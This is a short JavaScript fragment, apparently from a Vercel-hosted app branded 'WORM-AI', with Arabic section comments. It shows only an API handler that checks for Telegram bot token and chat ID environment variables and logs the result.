// ========================== WORM-AI💀🔥 FINAL CODE - VERSION 11 (TELEGRAM RESTORED) ==========================

// -----------------------------------------------------------------------------------------
// الجزء الأول: منطق الواجهة الخلفية (API)
// -----------------------------------------------------------------------------------------
async function handleApiRequest(req, res) {
    console.log('[WORM-AI LOG] API request received for Telegram.');

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('[WORM-AI ERROR] TELEGRAM FAILED: BOT_TOKEN or CHAT_ID are not set in Vercel Environment Variables.');
        return res.status(500).send('Internal Server Configuration Error');
    }
    console.log('[WORM-AI LOG] Telegram environment variables loaded successfully.');
...
// -----------------------------------------------------------------------------------------
// الجزء الثاني: منطق الواجهة الأمامية (HTML) مع القنوات
// -----------------------------------------------------------------------------------------
